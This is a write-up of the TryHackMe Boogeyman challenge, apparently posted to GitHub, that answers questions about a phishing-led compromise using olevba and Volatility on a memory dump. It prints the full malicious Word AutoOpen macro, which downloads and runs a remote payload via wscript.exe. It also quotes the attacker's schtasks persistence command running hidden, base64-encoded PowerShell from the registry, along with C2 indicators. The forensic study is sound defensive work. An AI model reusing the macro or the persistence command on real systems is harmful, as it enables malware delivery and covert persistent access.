# Phishing-Led Memory Forensics Investigation
## Boogeyman CTF

## TryHackme (Challenge)

### Tools Used: Volatility, Olevba

### Scenario

After recovering from a previous Boogeyman attack, **Quick Logistics LLC** strengthened its security defenses. Despite these improvements, the **Boogeyman threat group** launched a new phishing campaign using updated tactics, techniques, and procedures (TTPs). A phishing email was reported by an employee, and shortly after, suspicious behavior was observed on the victim’s workstation. A memory dump of the system was captured for further forensic analysis to identify malware execution, persistence, and attacker activity.

## **Alert: Phishing Email Alert** triggered by suspicious attachment and email headers

The Targeted user is Maxine received a phishing email that compromised the workstation.

The phishing email content overview

<img width="608" height="422" alt="Screenshot 2026-01-12 215043" src="https://github.com/user-attachments/assets/447a7e35-863f-464c-8d7b-ecfb1efa6e86" />


### Challenege Questions

1.What email was used to send the phishing email?

<img width="734" height="367" alt="Screenshot 2026-01-12 215620" src="https://github.com/user-attachments/assets/85fead13-f031-46f4-97e7-a1cdf517bebc" />

Answer: westaylor23@outlook.com 

2.What is the email of the victim employee?

<img width="747" height="374" alt="Screenshot 2026-01-12 215826" src="https://github.com/user-attachments/assets/73aebbfb-0f98-41a9-a82d-dc4bb4281119" />

Answer: maxine.beck@quicklogisticsorg.onmicrosoft.com

3.What is the name of the attached malicious document?

<img width="704" height="347" alt="Screenshot 2026-01-12 215953" src="https://github.com/user-attachments/assets/bb004047-5821-469f-9272-219ba7be293b" />

Answer: Resume_WesleyTaylor.doc

4.What is the MD5 hash of the malicious attachment?

Save the file and find hash value in terminal using md5sum 

Answer: 52c4384a0b9e248b95804352ebec6c5b

5.What URL is used to download the stage 2 payload based on the document's macro?

We have review the md5 hash value in virusTotal 

<img width="952" height="479" alt="Screenshot 2026-01-13 122930" src="https://github.com/user-attachments/assets/57c1e766-e036-4730-8d66-29996f42ed27" />

Answer: https://files.boogeymanisback.lol/aa2a9c53cbb80416d3b47d85538d9971/update.png

6.What is the name of the process that executed the newly downloaded stage 2 payload?
We need to use olevba tool to Analysis the malicious file 

```json
ubuntu@tryhackme:~/Desktop$ olevba Resume_WesleyTaylor.doc 
olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Resume_WesleyTaylor.doc
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Resume_WesleyTaylor.doc - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO NewMacros.bas 
in file: Resume_WesleyTaylor.doc - OLE stream: 'Macros/VBA/NewMacros'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()

spath = "C:\ProgramData\"
Dim xHttp: Set xHttp = CreateObject("Microsoft.XMLHTTP")
Dim bStrm: Set bStrm = CreateObject("Adodb.Stream")
xHttp.Open "GET", "https://files.boogeymanisback.lol/aa2a9c53cbb80416d3b47d85538d9971/update.png", False
xHttp.Send
With bStrm
    .Type = 1
    .Open
    .write xHttp.responseBody
    .savetofile spath & "\update.js", 2
End With

Set shell_object = CreateObject("WScript.Shell")
shell_object.Exec ("wscript.exe C:\ProgramData\update.js")

End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|write               |May write to a file (if combined with Open)  |
|Suspicious|Adodb.Stream        |May create a text file                       |
|Suspicious|savetofile          |May create a text file                       |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|WScript.Shell       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Microsoft.XMLHTTP   |May download files from the Internet         |
|Suspicious|Exec                |May run an executable file or a system       |
|          |                    |command using Excel 4 Macros (XLM/XLF)       |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |https://files.boogey|URL                                          |
|          |manisback.lol/aa2a9c|                                             |
|          |53cbb80416d3b47d8553|                                             |
|          |8d9971/update.png   |                                             |
|IOC       |update.js           |Executable file name                         |
|IOC       |wscript.exe         |Executable file name                         |
+----------+--------------------+---------------------------------------------+

```

Answer: wscript.exe

7.What is the full file path of the malicious stage 2 payload?

<img width="657" height="349" alt="Screenshot 2026-01-13 124136" src="https://github.com/user-attachments/assets/cebc200b-fdd0-4a98-8106-166e0ad7b287" />

Answer: C:\ProgramData\update.js

8.What is the PID of the process that executed the stage 2 payload?

For Knowing the PID of the process we have to analysis the file RAM memory “WKSTN-2961.raw” by using the tool Volatility. Command: vol WKSTN-2961.raw

<img width="960" height="390" alt="Screenshot 2026-01-13 125224" src="https://github.com/user-attachments/assets/59bc7210-6145-4b11-9fd6-1dae11b2a9ea" />

We need only windows.pstree.PsTree to know the PID

Command: vol -f WKSTN-2961.raw windows.pstree.PsTree

<img width="592" height="361" alt="Screenshot 2026-01-13 125936" src="https://github.com/user-attachments/assets/cdeecb17-3bf7-4da0-bde4-600c6341ab02" />

Answer: 4260

9.What is the parent PID of the process that executed the stage 2 payload?

<img width="592" height="361" alt="Screenshot 2026-01-13 125936" src="https://github.com/user-attachments/assets/4f8c9d36-f8d1-4e7b-bd41-2f580ea9d0c9" />

Answer: 1124

10.What URL is used to download the malicious binary executed by the stage 2 payload?

Answer: https://files.boogeymanisback.lol/aa2a9c53cbb80416d3b47d85538d9971/update.png

11.What is the PID of the malicious process used to establish the C2 connection?

After the malicious binary downloaded, it established C2 connection so it will be next after downloaded 

<img width="517" height="375" alt="Screenshot 2026-01-13 130552" src="https://github.com/user-attachments/assets/0109f260-77f7-4da2-b4b6-8d14f335ddec" />

Answer: 6216

12.What is the full file path of the malicious process used to establish the C2 connection?

Searching the updater.exe file related words by using this command :strings WKSTN-2961.raw | grep "updater.exe”

<img width="960" height="288" alt="Screenshot 2026-01-13 133709" src="https://github.com/user-attachments/assets/3a14f5bd-051b-4a1b-9da4-1043d2dae4b9" />

Answer: C:\Windows\Tasks\updater.exe

13.What is the IP address and port of the C2 connection initiated by the malicious binary? (Format: IP address:port)

Need windows.netscan.NetScan module to view the network connection 

<img width="960" height="378" alt="Screenshot 2026-01-13 131145" src="https://github.com/user-attachments/assets/07701397-f337-4cc8-a1e3-b3560b996f0d" />

<img width="960" height="364" alt="Screenshot 2026-01-13 133509" src="https://github.com/user-attachments/assets/db37b48a-ec86-48bb-a03f-ce5b94487ef8" />

Answer: 128.199.95.189:8080

14.What is the full file path of the malicious email attachment based on the memory dump?
Using Volatility tool and using Windows.filescan.FileScan module to get the full path of the email attached file. Command →  vol -f WKSTN-2961.raw windows.filescan.FileScan | grep "Resume_WesleyTaylor“

<img width="959" height="266" alt="Screenshot 2026-01-13 134532" src="https://github.com/user-attachments/assets/deb8ad44-b54c-49d9-b690-9051e832dba2" />

Answer:C:\Users\maxine.beck\AppData\Local\Microsoft\Windows\INetCache\Content.Outlook\WQHGZCFI\Resume_WesleyTaylor (002).doc

15.The attacker implanted a scheduled task right after establishing the c2 callback. What is the full command used by the attacker to maintain persistent access?

Searching using keywords that are related to scheduled task.Command → strings WKSTN-2961.raw | grep "schtasks”

<img width="960" height="364" alt="Screenshot 2026-01-13 134914" src="https://github.com/user-attachments/assets/bf8f45e2-5b10-4b95-8fda-46e3ed49d2dc" />

Answer: schtasks /Create /F /SC DAILY /ST 09:00 /TN Updater /TR 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NonI -W hidden -c \"IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKCU:\Software\Microsoft\Windows\CurrentVersion debug).debug)))\"’

### Done By Ruthran-sec
